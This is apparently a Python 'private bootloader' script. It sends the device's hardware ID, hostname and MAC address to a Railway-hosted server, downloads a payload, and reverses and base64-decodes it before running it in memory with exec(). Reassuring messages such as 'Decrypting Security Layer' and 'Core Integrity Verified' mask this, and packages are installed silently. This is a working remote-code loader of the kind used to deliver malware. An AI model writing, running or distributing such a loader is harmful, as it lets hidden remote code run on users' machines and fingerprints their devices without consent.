import subprocess
import requests
import os
import sys
import uuid
import platform
import base64
import socket
import time


RAILWAY_URL = "web-production-6e33.up.railway.app"

def get_device_info():
    try:
        hwid = str(uuid.getnode())
        hostname = socket.gethostname()
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
        return hwid, hostname, mac
    except:
        return "Unknown", "Unknown", "Unknown"

def install_missing_packages(required_list):
    
    if not required_list: return
    missing = []
    for lib in required_list:
        raw_name = lib.split('==')[0].split('>=')[0].lower()
        module_name = "win32" if "pywin32" in raw_name else raw_name
        try:
            __import__(module_name)
        except ImportError:
            missing.append(lib)

    if missing:
        print(f"\n📦 Components required for Engine: {', '.join(missing)}")
        for lib in missing:
            print(f"📥 Installing {lib}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            except:
                print(f"❌ Failed to install {lib}")

def fetch_and_run():
    hwid, hostname, mac = get_device_info()
    params = {'hwid': hwid, 'device': hostname, 'mac': mac}

    try:
        print(f"🛰️ Connecting to Cloud Engine...")
    
        response = requests.get(
            f"https://{RAILWAY_URL}/get_core", 
            params=params, 
            timeout=30
        )
        
        if response.status_code == 200:
            data = response.json()
            masked_payload = data.get("core", "")
            
            if masked_payload:
                print("🔓 Decrypting Security Layer...")
               
                unmasked_data = masked_payload[::-1]
                decoded_code = base64.b64decode(unmasked_data.encode('utf-8')).decode('utf-8')
                
                print("✅ Core Integrity Verified.")
                print("🚀 Booting Engine in Memory...")
                
                
                exec(decoded_code, globals())
            else:
                print("⚠️ Error: Engine Core is empty.")
        else:
            print(f"❌ Server Error: {response.status_code}")

    except Exception as e:
        print(f"❌ Boot Failure: {e}")

def main():
   
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print("="*45)
    print("      🚀 70SNY_0xHUNTER - PRIVATE BOOTLOADER")
    print("         Secure Cloud Synchronization")
    print("="*45)
    
    # التأكد من وجود مكتبة requests أولاً
    try:
        import requests
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    
    
    install_missing_packages(['flask', 'playwright', 'requests'])
    
    fetch_and_run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()